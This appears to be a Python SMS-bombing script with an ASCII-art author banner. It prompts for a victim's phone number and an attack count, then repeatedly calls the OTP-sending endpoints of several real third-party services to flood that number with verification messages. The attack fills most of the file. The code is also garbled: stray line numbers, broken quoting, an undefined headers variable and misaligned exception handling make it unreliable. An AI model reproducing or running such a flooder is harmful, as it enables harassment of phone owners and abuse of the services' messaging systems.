green = '\033[1;32m'
2.end = '\033[0m'
3.print (green+"""_______ _    _ _  _____
 |__   __| |  | (_)/ ____|
    | |  | |__| |_| (___
    | |  |  __  | |\___ \
    | |  | |  | | |____) |
   _|_|_ |_|  |_|_|_____/____   __  __
  / ____|      / ____|__   __| |  \/  |
 | (___  _   _| (___    | | ___| \  / |
  \___ \| | | |\___ \   | |/ _ \ |\/| |
  ____) | |_| |____) |  | |  __/ |  | |
 |_____/ \__, |_____/___|_|\___|_|  |_|
  / ____| __/ |     |__   __|
 | |     |___/___  __ _| | ___  _ __
 | |    | '__/ _ \/ _` | |/ _ \| '__|
 | |____| | |  __/ (_| | | (_) | |
  \_____|_|  \___|\__,_|_|\___/|_|
 |  _ \
 | |_) |_   _
 |  _ <| | | |
 | |_) | |_| |
 |____/ \__, |
         __/ |
   __  _|___/ _____         _____ _    _       _  ___ ____   __
  / / | |  | |  __ \       / ____| |  | |     | |/ (_)  _ \  \ \
 | |  | |__| | |  | |_____| (___ | |__| | __ _| ' / _| |_) |  | |
 | |  |  __  | |  | |______\___ \|  __  |/ _` |  < | |  _ <   | |
 | |  | |  | | |__| |      ____) | |  | | (_| | . \| | |_) |  | |
 | |  |_|  |_|_____/      |_____/|_|  |_|\__,_|_|\_\_|____/   | |
  \_\                                                        /_
  
  # CVALUE
  blue = '\33[94m'
  lightblue = '\033[94m'
  red = '\033[91m'
  white = '\33[97m'42.
  yellow = '\33[93m'43.
  green = '\033[1;32m'
  cyan = "\033[96m"
  end = '\033[0m'
  print ("\033[32m")
  
  print ("	 -!-!- WeLcOmE-!-!- ( RS-RisHaD )  
    ( RisHaDSoBuJ ) ")
    
    print ("""
    ╔═════════════════════════════════╗
 ║ AuTHor : RisHaD ツ ║ ║ FaCeBooK : Rishad RS 
║ ║ GitHuB : iTzRisHaD ║ ╚═════════════════════════════════╝
""")
number = str(input("[>] Heii Mr : RisHaD Sir. apNar aTTack NumBer DiN: "))
amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))
url1 = "https://ucapi.vnksrvc.com/users/send_user_otp.json"
headers1["Content-Type"]="application/json
data1 = """{
   \"direct_login\": true,
   \"user\": {
       \"resend\": false,
       \"login\": \"88"""+number+"""\",
       \"type\": {
       \"register\": true
                }
            }
    }"""
url2 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"
"http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number
for i in range(amount) :	
                     try:
                     	resp1 = requests.post(url1, headers=headers1, data=data1)
                     	resp2 = requests.get(url2)
                     	print(str (i+1)+" aTTack SenT \n")
                     	except:		
                                           print ("RisHaD TuMar PHonE a neTwOrk a RakHo...")